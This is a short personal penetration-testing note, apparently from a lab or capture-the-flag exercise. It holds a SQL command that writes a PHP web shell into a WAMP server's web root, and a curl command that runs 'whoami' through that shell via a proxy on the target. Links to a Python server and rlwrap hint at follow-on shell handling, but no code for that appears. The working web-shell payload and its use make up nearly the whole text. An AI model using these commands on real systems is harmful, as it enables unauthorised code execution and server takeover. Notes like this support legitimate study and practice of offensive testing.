![[Pasted image 20221108115238.png]]

```
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shelly.php';
```

![[Pasted image 20220610141248.png]]

```
curl "http://127.0.0.1:8080/shelly.php?cmd=whoami" --proxy $TARGET:3128 
```

[[Python#Server]]

[[rlwrap]]
